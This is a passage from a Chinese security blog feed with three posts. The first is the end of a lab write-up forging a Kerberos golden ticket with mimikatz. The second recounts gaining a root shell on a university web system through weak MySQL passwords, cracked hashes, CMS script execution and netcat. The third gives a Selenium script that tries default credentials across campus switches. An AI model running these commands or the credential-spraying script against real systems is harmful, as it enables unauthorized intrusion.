class="hljs-keyword">cs</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825163812010.png" alt="image-20210825163812010"></p><p>之后导出hash</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825171429435.png" alt="image-20210825171429435"></p><h3 id="0x0B-预期解-权限维持"><a href="#0x0B-预期解-权限维持" class="headerlink" title="0x0B 预期解-权限维持"></a>0x0B 预期解-权限维持</h3><p>之后试试黄金票据进行权限维持</p><p>先是获取需要伪造用户的SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic useraccount get name,sid<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825173605240.png" alt="image-20210825173605240"></p><p>在之前的HashDump中能够拿到krbtgt的NTLM Hash，我们使用它来生成黄金票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::golden /admin:administrator /domain:demo.com /sid:S<span class="hljs-literal">-1-5-21-979886063-1111900045-1414766810</span> /krbtgt:<span class="hljs-number">7</span>c4ed692473d4b4344c3ba01c5e6cb63 /ticket:Administrator.kiribi<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825174417763.png" alt="image-20210825174417763"></p><p>之后对票据有效性进行验证</p><p>首先清除内存中的票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::purge<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825174930517.png" alt="image-20210825174930517"></p><p>尝试域控的目录，可以看到权限不足</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825174943935.png" alt="image-20210825174943935"></p><p>将生成的黄金票据注入到内存中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::ptt Administrator.kiribi<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825175010502.png" alt="image-20210825175010502"></p><p>查看注入的票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::tgt<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825175026691.png" alt="image-20210825175026691"></p><p>再尝试列目录，可以看到成功了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B.assets/image-20210825175037089.png" alt="image-20210825175037089"></p><p>这样，我们就可以在一段时间内维持域内权限了，只要krbtgt不更改密码这张票据就一直有效。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>vulstack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某大学关键系统shell过程记录</title>
    <link href="/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>本文只作复盘记录，不得将其用于违法用途。</p><h1 id="2-记录"><a href="#2-记录" class="headerlink" title="2.记录"></a>2.记录</h1><p>是某大学的教师个人主页网站，预览界面如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206094615339.png" alt="在这里插入图片描述"></p><p>在某次大规模的内网扫描中发现有一个弱口令的MYSQL，</p><p>密码是root 123456</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206094820936.png" alt="在这里插入图片描述"></p><p>登录进去发现有些熟悉，发现是咱们学校教师个人主页的后端数据库，由之前对整个网站的架构了解到这应该是一个站库分离的系统。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095033515.png" alt="在这里插入图片描述"></p><p>但是十分可惜的是这个似乎是一个已经被弃用的数据库，里边的数据都有好多年没更新了。。</p><p>而且这个mysql虽然是root，但由于提权失败，这个机子最终还是没能拿下来。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095122586.png" alt="在这里插入图片描述"></p><p>心灰意冷之际，抱着试一试的心态用nmap扫描了全部的端口，然后发现新的数据库也架在上面。。。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095521904.png" alt="在这里插入图片描述"></p><p>这就有意思了，我们再试试root 123456</p><p>一发入魂</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095555123.png" alt="在这里插入图片描述"></p><p>然而这台机子还是提权失败了，但没关系，我们可以把目光转向网页端，也即是尝试着拿一下前端的shell</p><p>从数据库中翻到管理员的密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095801537.png" alt="在这里插入图片描述"></p><p>这个密文我们可能一开始不知道是什么加密方式，但是没关系，我们有方法找到。</p><p>在上面的图中，我们可以发现有很多相同的值。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095856741.png" alt="在这里插入图片描述"></p><p>可以推测这个就是网站的初始密码，初始密码一般来说不会太复杂，我们可以试着去搜一哈。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206095932567.png" alt="在这里插入图片描述"></p><p>好吧，有些尴尬。。但是没关系啊，我们还有另一个数据库呢，我们用它试试</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100053382.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100234982.png" alt="在这里插入图片描述"></p><p>这不就出来了吗</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100352648.png" alt="在这里插入图片描述"></p><p>由这个我们不难看出密码是经过一次sha1加密后将原始的二进制字节流再进行了一次base64编码</p><p>通过一些简单的转换我们可以拿到原始的hexdigest：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100430714.png" alt="在这里插入图片描述"></p><p>将其拿去解密可以拿到管理员的密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100514715.png" alt="在这里插入图片描述"></p><p>登录之</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100618689.png" alt="在这里插入图片描述"></p><p>找了半天上传马子的地方，然后发现这个CMS自带命令执行。。。</p><p>在服务器管理–&gt;脚本 中直接能执行系统命令</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100740291.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100831340.png" alt="在这里插入图片描述"></p><p>下面这个更完善一些：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">command</span> = <span class="hljs-string">&quot;&quot;&quot;executable arg1 arg2 arg3&quot;&quot;&quot;</span>// Create the String<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proc</span> = command.execute()                 // Call *execute* on the string<br>proc.waitFor()                               // Wait <span class="hljs-keyword">for</span> the command to finish<br><br>// Obtain status <span class="hljs-keyword">and</span> output<br>println <span class="hljs-string">&quot;return code: $&#123; proc.exitValue()&#125;&quot;</span><br>println <span class="hljs-string">&quot;stderr: $&#123;proc.err.text&#125;&quot;</span><br>println <span class="hljs-string">&quot;stdout: $&#123;proc.in.text&#125;&quot;</span> // *out* <span class="hljs-keyword">from</span> the external program <span class="hljs-keyword">is</span> *<span class="hljs-keyword">in</span>* <span class="hljs-keyword">for</span> groovy<br></code></pre></td></tr></table></figure><p>试了一下没能反弹回shell，猜测是防火墙做了限制。但没关系啊，shell还有正向的呢。</p><p>肥肠幸运的是这台机器刚好有nc：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206100955847.png" alt="在这里插入图片描述"></p><p>我们让其监听，然后我们连过去即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206101026142.png" alt="在这里插入图片描述"></p><p>接下来就可以进行一系列的权限维持操作了，到后面我们成功拿下了root的交互式shell</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95.assets/20210206101127694.png" alt="在这里插入图片描述"></p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>运气很重要<br>不要放过任何一个可能出现问题的点<br>思维要灵活，懂得在特定场景下合理运用所学的知识</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>实战记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>实战记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某校区大范围交换机弱口令调查记录</title>
    <link href="/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>在某次例行的测试中发现某交换机存在弱口令，进行横向测试时发现影响范围较广，遂有此报告。本次受影响的交换机有 620 台，涉及主机 4362 台，光缆 865 条。对学校整体具有较大的威胁性。</p><p>本文仅作复盘记录，请勿将其用于违法行为。</p><h1 id="2-探测过程"><a href="#2-探测过程" class="headerlink" title="2. 探测过程"></a>2. 探测过程</h1><p>对校内 10 段内网地址进行大规模扫描发现有 1124 个交换机的相关接口</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95.assets/20210301135522327.jpg" alt="在这里插入图片描述"></p><p>在进行弱口令的尝试过程中发现 admin admin@123 可以成功登陆，且拥有对交换机整体的控制权</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95.assets/20210301135522125.jpg" alt="在这里插入图片描述"></p><p>基于横向渗透的思想，我们对上述得到的交换机地址都用这个账号密码进行爆破</p><p>由于在写爆破脚本的时候ssl连接一直会出现问题。最后不得不放弃了requests直接发包的方式，而是使用了selenium来帮助我们完成工作</p><p>最后我们的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.common.exceptions <span class="hljs-keyword">import</span> NoSuchElementException<br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> ActionChains<br><span class="hljs-keyword">from</span> selenium.webdriver.support.select <span class="hljs-keyword">import</span> Select<br><span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> selenium.webdriver.support.wait <span class="hljs-keyword">import</span> WebDriverWait<br><span class="hljs-keyword">from</span> selenium.webdriver.chrome.options <span class="hljs-keyword">import</span> Options<br><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> threading<br><br><br><br>options = webdriver.ChromeOptions()<br>options.add_argument(<span class="hljs-string">&#x27;--ignore-certificate-errors&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:\Users\shinelon\Desktop\summary.txt&quot;</span>,encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    urls= f.read().splitlines()<br><br>q = Queue(maxsize=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> urls:<br>    q.put(each)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_vuln</span>(<span class="hljs-params">browser</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> q.empty():<br>            <span class="hljs-keyword">break</span><br>        url = q.get()<br>        url = url.split()[<span class="hljs-number">3</span>]<br>        <span class="hljs-keyword">try</span>:<br>            browser.get(url)<span class="hljs-comment">#打开浏览器预设网址</span><br>            time.sleep(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/simple/view/login.html&quot;</span> <span class="hljs-keyword">in</span> browser.current_url:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Find: &quot;</span>+ browser.current_url)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            time.sleep(<span class="hljs-number">3</span>)<br>            result = alert_is_present()(browser)<br>            <span class="hljs-keyword">if</span> result:<br>                result.accept()<br><br>            locator = (By.ID, <span class="hljs-string">&#x27;UserName&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br>            locator = (By.ID, <span class="hljs-string">&#x27;userPassword&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br>            locator = (By.ID, <span class="hljs-string">&#x27;goBtn&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br>            browser.find_element_by_id(<span class="hljs-string">&quot;UserName&quot;</span>).send_keys(<span class="hljs-string">&quot;admin&quot;</span>)<br>            <span class="hljs-comment"># 输入密码</span><br>            browser.find_element_by_id(<span class="hljs-string">&quot;userPassword&quot;</span>).send_keys(<span class="hljs-string">&quot;admin@123&quot;</span>)<br><br>            browser.find_element_by_id(<span class="hljs-string">&quot;goBtn&quot;</span>).click()<br><br>            time.sleep(<span class="hljs-number">3</span>)<br>            data = browser.page_source<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;LSW&quot;</span> <span class="hljs-keyword">in</span> browser.title:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Success :&quot;</span> + url)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_all</span>():<br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>):<br>        browser=webdriver.Chrome(options=options)<br>        th = threading.Thread(target=try_vuln,args=(browser,))<br>        th.start()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">alert_is_present</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Expect an alert to be present.&quot;&quot;&quot;</span><br><br>    <span class="hljs-string">&quot;&quot;&quot;判断当前页面的alert弹窗&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, driver</span>):<br>        <span class="hljs-keyword">try</span>:<br>            alert = driver.switch_to.alert<br>            <span class="hljs-keyword">return</span> alert<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_all()<br></code></pre></td></tr></table></figure><p>最后，我们得到了如下的结果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95.assets/20210301135522419.jpg" alt="在这里插入图片描述"></p><p>之后对脚本进行改动，对这些交换机进行详细信息的记录，估计影响范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.common.exceptions <span class="hljs-keyword">import</span> NoSuchElementException<br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> ActionChains<br><span class="hljs-keyword">from</span> selenium.webdriver.support.select <span class="hljs-keyword">import</span> Select<br><span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> selenium.webdriver.support.wait <span class="hljs-keyword">import</span> WebDriverWait<br><span class="hljs-keyword">from</span> selenium.webdriver.chrome.options <span class="hljs-keyword">import</span> Options<br><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br><br>fiber_count = <span class="hljs-number">0</span><br>port_count = <span class="hljs-number">0</span><br><br>options = webdriver.ChromeOptions()<br>options.add_argument(<span class="hljs-string">&#x27;--ignore-certificate-errors&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span 